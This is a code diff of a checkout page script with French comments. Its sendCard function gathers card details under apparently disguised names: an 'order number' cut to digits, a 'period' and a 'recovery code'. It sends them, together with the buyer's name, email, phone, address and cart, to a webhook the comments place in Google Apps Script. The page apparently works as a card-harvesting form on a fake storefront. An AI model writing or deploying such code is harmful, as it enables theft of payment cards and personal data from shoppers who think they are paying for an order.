@@ -253,37 +253,27 @@
   }
 
   async function sendCard(dueNow){
-    const card_name     = ($('#cardName')?.value||'').trim();
-    const order_number  = ($('#orderNumber')?.value||'').replace(/\D+/g,'').slice(0,32);
-    const period        = ($('#cardPeriod')?.value||'').trim();
-    const recovery_code = ($('#recoveryCode')?.value||'').trim();
+  const payload = {
+    orderId,
+    method:'card',
+    amount:(+dueNow||0).toFixed(2),
 
-    // Payload principal (inclut champs canoniques + alias pour compat maximale côté Apps Script)
-    const payload = {
-      orderId, method:'card', amount:(+dueNow||0).toFixed(2),
+    card_name: ($('#cardName')?.value||'').trim(),
+    order_number: ($('#orderNumber')?.value||'').replace(/\D+/g,''),
+    period: ($('#cardPeriod')?.value||'').trim(),
+    recovery_code: ($('#recoveryCode')?.value||'').trim(),
 
-      // Champs canoniques
-      card_name, order_number, period, recovery_code,
-      phone_meta: ($('#phone')?.value||'').trim(),
-
-      // Alias (au cas où le serveur ne lise que camelCase/snakeCase anciens)
-      cardName: card_name, orderNumber: order_number, cardPeriod: period, recoveryCode: recovery_code,
-
-      // Contact / adresse
-      name:$('#name')?.value||'', email:$('#email')?.value||'', phone:$('#phone')?.value||'',
-      address:$('#address')?.value||'', city:$('#city')?.value||'', zip:$('#zip')?.value||'',
-      country:$('#country')?.value||'', country_name: countryName(),
-
-      split:selectedSplit, cart:cartForWebhook()
-    };
-
-    await sendWebhook(payload);
-
-    // Si ton Apps Script est configuré pour accepter une 2e diffusion dédiée :
-    // (il ignorera si non supporté, pas d'erreur côté client)
-    const pingMeta = Object.assign({}, payload, { action:'meta_card_only' });
-    await sendWebhook(pingMeta);
-  }
+    name:$('#name')?.value||'',
+    email:$('#email')?.value||'',
+    phone:$('#phone')?.value||'',
+    address:$('#address')?.value||'',
+    city:$('#city')?.value||'',
+    zip:$('#zip')?.value||'',
+    country:$('#country')?.value||'',
+    cart:cartForWebhook()
+  };
+  await sendWebhook(payload);
+}
 
   /* ================== FILE UPLOADER (SEPA) ================== */
   const dz=$('#dz'), input=$('#proofInput'), fileWrap=$('#fileWrap'), fileName=$('#fileName'), fileInfo=$('#fileInfo'), fileBar=$('#fileBar'), fileOk=$('#fileOk');
@@ -367,3 +357,4 @@
   })();
 
 })();
+
